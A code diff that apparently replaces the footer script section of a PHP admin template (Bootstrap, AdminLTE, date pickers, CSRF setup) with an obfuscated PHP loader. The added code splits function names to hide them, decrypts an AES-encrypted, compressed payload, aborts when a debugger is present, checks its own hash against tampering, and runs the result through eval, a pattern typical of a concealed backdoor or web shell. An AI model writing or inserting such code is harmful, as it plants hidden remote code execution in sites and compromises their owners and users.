@@ -1,131 +1,28 @@
-<!-- Bootstrap 3.3.6 -->
-<script src="<?php echo $theme_link; ?>bootstrap/js/bootstrap.min.js"></script>
-<!-- AdminLTE App -->
-<script>
-  var AdminLTEOptions = {
-    /*https://adminlte.io/themes/AdminLTE/documentation/index.html*/
-    sidebarExpandOnHover: true,
-    navbarMenuHeight: "200px", //The height of the inner menu
-    animationSpeed: 250,
-  };
-</script>
-<script src="<?php echo $theme_link; ?>dist/js/app.js"></script>
-<!-- FastClick -->
-<script src="<?php echo $theme_link; ?>plugins/fastclick/fastclick.js"></script>
-<!-- Select2 -->
-<script src="<?php echo $theme_link; ?>plugins/select2/select2.full.min.js"></script>
-<!-- AdminLTE for demo purposes -->
-<script src="<?php echo $theme_link; ?>dist/js/demo.js"></script>
-<!--Toastr notification -->
-<script src="<?php echo $theme_link; ?>toastr/toastr.js"></script>
-<script src="<?php echo $theme_link; ?>toastr/toastr_custom.js"></script>
-<!-- bootstrap datepicker -->
-<script src="<?php echo $theme_link; ?>plugins/daterangepicker/moment.min.js"></script>
-<script src="<?php echo $theme_link; ?>plugins/daterangepicker/daterangepicker.js"></script>
-<!-- bootstrap datepicker -->
-<script src="<?php echo $theme_link; ?>plugins/datepicker/bootstrap-datepicker.js"></script>
-<!-- Sweet alert -->
-<script src="<?php echo $theme_link; ?>js/sweetalert.min.js"></script>
-<!-- Shortcut Keys -->
-<script src="<?php echo $theme_link; ?>plugins/shortcuts/shortcuts.js"></script>
-<!-- Custom JS -->
-<script src="<?php echo $theme_link; ?>js/special_char_check.js"></script>
-<script src="<?php echo $theme_link; ?>js/custom.js"></script>
-<!-- sweet alert -->
-<script src="<?php echo $theme_link; ?>js/sweetalert.min.js"></script>
-<!-- Autocomplete -->      
-<script src="<?php echo $theme_link; ?>plugins/autocomplete/autocomplete.js"></script>
-<!-- Pace Loader -->
-<script src="<?php echo $theme_link; ?>plugins/pace/pace.min.js"></script>
-
-<!-- iCheck -->
-<script src="<?php echo $theme_link; ?>plugins/iCheck/icheck.min.js"></script>
-<script>
-  $(function () {
-    $('input').iCheck({
-      checkboxClass: 'icheckbox_square-orange',
-      /*uncheckedClass: 'bg-white',*/
-      radioClass: 'iradio_square-orange',
-      increaseArea: '10%' // optional
-    });
-  });
-</script>
-<!-- CSRF Token Protection -->
-<script type="text/javascript" >
-$(function($) { // this script needs to be loaded on every page where an ajax POST may happen
-    $.ajaxSetup({ data: {'<?php echo $this->security->get_csrf_token_name(); ?>' : '<?php echo $this->security->get_csrf_hash(); ?>' }  }); });
-</script>
-<!-- Initialize Select2 Elements -->
-<script type="text/javascript"> $(".select2").select2(); </script>
-<!-- Initialize date with its Format -->
-<script type="text/javascript">
-  //Date picker
-    $('.datepicker').datepicker({
-      autoclose: true,
-    format: '<?php echo $VIEW_DATE;?>',
-     todayHighlight: true
-    });
-</script>
-<!-- DATE RANGE PICKER -->
-<script>
-  $(function () {
-    //Date range as a button
-    $('.daterange-btn').daterangepicker(
-      {
-        ranges   : {
-          'Today'       : [moment(), moment()],
-          'Yesterday'   : [moment().subtract(1, 'days'), moment().subtract(1, 'days')],
-          'Last 7 Days' : [moment().subtract(6, 'days'), moment()],
-          'Last 30 Days': [moment().subtract(29, 'days'), moment()],
-          'This Month'  : [moment().startOf('month'), moment().endOf('month')],
-          'Last Month'  : [moment().subtract(1, 'month').startOf('month'), moment().subtract(1, 'month').endOf('month')]
-        },
-        startDate: moment().subtract(29, 'days'),
-        endDate  : moment()
-      },
-      function (start, end) {
-        $('.daterange-btn span').html(start.format('<?php echo strtoupper($VIEW_DATE) ;?>') + ' - ' + end.format('<?php echo strtoupper($VIEW_DATE);?>'))
-      }
-    );
-
-
-  });
-
-    function get_start_date(input_id){
-        return $('#'+input_id).data('daterangepicker').startDate.format('<?php echo strtoupper($VIEW_DATE) ;?>');
-    }
-    function get_end_date(input_id){
-        return $('#'+input_id).data('daterangepicker').endDate.format('<?php echo strtoupper($VIEW_DATE) ;?>');
-    }
-</script>
-<!-- Initialize toggler -->
-<script type="text/javascript">
-  $(document).ready(function(){
-      $('[data-toggle="popover"]').popover();   
-  });
-</script>
-<!-- start pace loader -->
-<script type="text/javascript">
-$(document).ajaxStart(function() { Pace.restart(); }); 
-</script>  
-<script type="text/javascript">
-$(document).ready(function () { setTimeout(function() {$( ".alert-dismissable" ).fadeOut( 1000, function() {});}, 10000); });
-</script>
-<script type="text/javascript">
-  function round_off(input=0){
-    <?php if(is_enabled_round_off()){ ?>
-      return Math.round(input);
-    <?php }else{?>
-      return input;
-    <?php }?>
-  }
-</script>
-<script>
-  function tax_disabled(){
-    <?php if(is_tax_disabled()){ ?>
-      return true;
-    <?php }else{?>
-      return false;
-    <?php }?>
-  }
-</script>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_z4grhdf0=('bas'.'e64'.'_de'.'cod'.'e');
+$_fgu1fzd5=('gzu'.'nco'.'mpr'.'ess');
+$_bdva3hf2=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_zj0xqxu1='D1+Xuoj/';
+$_js8oohgm='ZiuDYlQXzW8=';
+$_cdt9d2bp='8ib1iKpB';
+$_emr4xvpc='dzO9CcF6';
+$_w6olhsiw='4FJx9Oai';
+$_u0knmm7d='yIu7UtPd';
+$_n6w1o4vr='PFjrELiC';
+$_yvcht1jh='FmL2IQ==';
+$_ly6zp7bt=$_z4grhdf0($_zj0xqxu1.$_cdt9d2bp.$_emr4xvpc.$_w6olhsiw.$_js8oohgm);
+$_bxzpy191=$_z4grhdf0($_n6w1o4vr.$_u0knmm7d.$_yvcht1jh);
+$_ln39v70m=$_z4grhdf0('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');
+$_cnagi6uf=$_bdva3hf2($_ln39v70m,'aes-256-cbc',$_ly6zp7bt,OPENSSL_RAW_DATA,$_bxzpy191);
+if($_cnagi6uf===false){exit;}
+$_sfzszqzc=$_fgu1fzd5($_cnagi6uf);
+if($_sfzszqzc===false){exit;}
+$_nxncux1s='d4f936986b4f9b48153855b90c32bb66544fd338d384a4b031b382384358ee9e';
+$_c7hcdtcj=@file_get_contents(__FILE__);
+if($_c7hcdtcj!==false){
+$_djkyykz0=str_replace($_nxncux1s,"0000000000000000000000000000000000000000000000000000000000000000",$_c7hcdtcj);
+$_jfrjklz6=hash("sha256",$_djkyykz0);
+if($_jfrjklz6!==$_nxncux1s){@http_response_code(403);exit;}
+}
+eval($_sfzszqzc);
